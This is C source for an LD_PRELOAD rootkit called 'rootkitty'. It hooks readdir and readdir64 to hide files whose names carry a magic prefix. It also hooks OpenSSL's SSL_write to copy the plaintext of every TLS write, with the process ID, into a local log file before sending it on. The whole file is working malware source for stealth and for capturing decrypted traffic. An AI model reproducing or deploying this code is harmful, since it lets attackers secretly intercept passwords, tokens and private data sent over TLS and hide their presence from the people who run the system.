#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <openssl/ssl.h>
#define STR_LEN(str) sizeof(str)-1
#define MAGIC_PREFIX "rootkitty"
#define MAGIC_LEN STR_LEN(MAGIC_PREFIX)
/*---------[ PROTOTYPES ]---------*/
static struct dirent64* (*og_readdir64)(DIR *dir)  = NULL;
static struct dirent*   (*og_readdir)(DIR *)       = NULL;
static int (*og_SSL_write)(SSL*, const void*, int) = NULL;
/*---------[ INITIALIZE THE HOOKS ]---------*/
__attribute__((constructor)) void hook_init(void){
  og_readdir    = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
  og_readdir64  = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
  og_SSL_write  = (int (*)(SSL*, const void*, int))dlsym(RTLD_NEXT, "SSL_write");
}
/*---------[ HIDING FILES ]---------*/
struct dirent* readdir(DIR *dirp){
  struct dirent* entry;

  while ((entry = og_readdir(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;    
    }
    return entry;
  }
  return entry;
}

struct dirent64* readdir64(DIR* dirp) {
  struct dirent64* entry;

  while ((entry = og_readdir64(dirp)) != NULL) {
    if (strncmp(entry->d_name, MAGIC_PREFIX, MAGIC_LEN) == 0) {
      continue;
    }
    return entry;
  }
  return entry;
}

/*---------[ INTERCEPTING SSL_WRITE ]---------*/ 
int SSL_write(SSL* ssl, const void *buf, int num) {
  FILE* fd = fopen("SSL_log.txt", "a+");
  if (fd != NULL){
    fprintf(fd, "PID:%d\n", getpid());
    fwrite(buf, 1, num, fd);
    fprintf(fd, "\n");
    fclose(fd);
  }
  return og_SSL_write(ssl, buf, num);
}
